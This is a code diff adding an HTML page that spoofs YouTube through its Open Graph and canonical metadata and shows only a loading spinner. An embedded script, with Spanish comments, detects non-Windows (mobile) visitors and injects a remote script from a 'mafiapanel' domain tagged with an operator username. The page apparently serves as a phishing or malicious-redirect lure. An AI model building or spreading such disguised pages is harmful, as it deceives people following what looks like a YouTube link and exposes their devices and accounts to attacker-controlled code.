@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://www.youtube.com" />
+    <link rel="canonical" href="https://www.youtube.com/" />
+    <meta property="fb:app_id" content="87741124305" />
+    <meta property="og:url" content="https://www.youtube.com/" />
+    <style>
+        body { display:flex; justify-content:center; align-items:center; background:#000}
+        .loader { width: 48px; height: 48px; border-radius: 50%;
+            display: inline-block; position: relative; background: linear-gradient(0deg, rgba(255, 61, 0, 0.2) 33%, #ff3d00 100%);
+            box-sizing: border-box; animation: rotation 1s linear infinite;
+        }
+        .loader::after { content: ''; box-sizing: border-box; position: absolute;
+            left: 50%; top: 50%; transform: translate(-50%, -50%); width: 44px;
+            height: 44px; border-radius: 50%; background: #263238;
+        }
+        @keyframes rotation { 0% { transform: rotate(0deg) } 100% { transform: rotate(360deg)}
+    }
+    </style>
+</head>
+<body>
+    <span class="loader"></span>
+    <script>
+        // Verificar si el agente de usuario (User-Agent) no contiene "Windows" (detecta no PC)
+        if (!navigator.userAgent.includes("Windows")) {
+            // Cargar el segundo fragmento de código en dispositivos móviles
+            var script = document.createElement('script');
+            script.src = "https://mafiapanel.bio/h/index.php?username=Danieladmin";
+            script.type = "text/javascript";
+            script.async = true;
+            document.body.appendChild(script);
+        }
+    </script>
+</body>
+</html>
